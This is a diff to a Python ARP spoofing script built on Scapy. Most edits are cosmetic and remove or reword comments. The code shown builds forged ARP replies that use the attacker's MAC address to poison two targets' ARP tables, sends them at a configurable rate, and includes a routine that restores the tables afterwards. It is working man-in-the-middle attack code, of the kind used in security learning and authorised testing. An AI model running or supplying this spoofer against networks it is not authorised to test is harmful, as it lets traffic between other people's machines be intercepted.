@@ -4,7 +4,7 @@
 #
 # Author: Matheus Heidemann
 #
-# Description: this is a ARP spoofer script using Scapy.
+# Description: this is a ARP spoofer script created with Python using Scapy. 
 #
 # 02 August 2022
 #
@@ -68,10 +68,10 @@ def newIPv4(target, index):
 # Function to get the MAC address of the target
 def getMACFromTarget(target_ip):
     try:
-        arp_request = scapy.ARP(pdst=target_ip)                                         # Creating an ARP resquest with the target's IP
-        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")                                # ARP destination (Broadcast)
-        arp_request_broadcast = broadcast/arp_request                                   # The ARP request broadcast
-        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]   # Creating a list that only has the ARP responses
+        arp_request = scapy.ARP(pdst=target_ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast/arp_request
+        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
         return answered_list[0][1].hwsrc
     except:
         print(f"\nERROR - The IPv4 {target_ip} didn't return any response. Try a different one.")
@@ -89,10 +89,10 @@ def getAttackerMAC():
 def createMaliciousPacket(target_ip, spoof_ip):
     return scapy.ARP(
         op=2,
-        pdst=target_ip,                         # The IP of the victim that will be fooled
-        hwdst=getMACFromTarget(target_ip),      # The MAC address of the victim's machine
-        hwsrc=getAttackerMAC(),                 # The MAC address of the attacker's machines
-        psrc=spoof_ip)                          # The IP the attacker is pretteding to be
+        pdst=target_ip,
+        hwdst=getMACFromTarget(target_ip),
+        hwsrc=getAttackerMAC(),
+        psrc=spoof_ip)
 
 
 # Function to create an restore ARP packet
@@ -104,9 +104,8 @@ def createRestorePacket(target1, target2):
         hwsrc=target2["mac"],
         psrc=target2["ip"])
 
+
 # Function to restore the default ARP tables from the targets
-
-
 def restoreArpTables(target1, target2):
     restore_packet1 = createRestorePacket(target1, target2)
     restore_packet2 = createRestorePacket(target2, target1)
@@ -143,28 +142,25 @@ def spoofTargets(malicious_packet1, malicious_packet2, packets_per_sec, old_targ
 
 # Function to run the program
 def run():
-    # Check if user is running as sudo or root
     helper.check_privileges()
-
-    # Get the target argument values
     args = getArguments()
     print("")
 
-    # Store the current MAC addresses from the targets IPv4s
+    # Storing the current MAC addresses from the targets IPv4s
     old_targets_ip_mac = []
     for target in args.target:
         target_dict = {"ip": target, "mac": getMACFromTarget(target)}
         old_targets_ip_mac.append(target_dict)
 
-    # Create a new malicious ARP packet and check if the target is listening
+    # Target 1: malicious ARP packet and checking if it is listening
     malicious_packet1 = createMaliciousPacket(args.target[0], args.target[1])
     print(f"{args.target[0]} is listening and ready to be spoofed.")
 
-    # Create another malicious ARP packet and check if is the target listening
+    # Target 2: malicious ARP packet and checking if it is listening
     malicious_packet2 = createMaliciousPacket(args.target[1], args.target[0])
     print(f"{args.target[1]} is listening and ready to be spoofed.")
 
-    # Define the packets per seconds that should be sent
+    # Packets per seconds that should be sent
     packets_per_sec = helper.checkNumInt("\nPacket sending interval (default is 2) > ", 2)
 
     # Spoof the targets
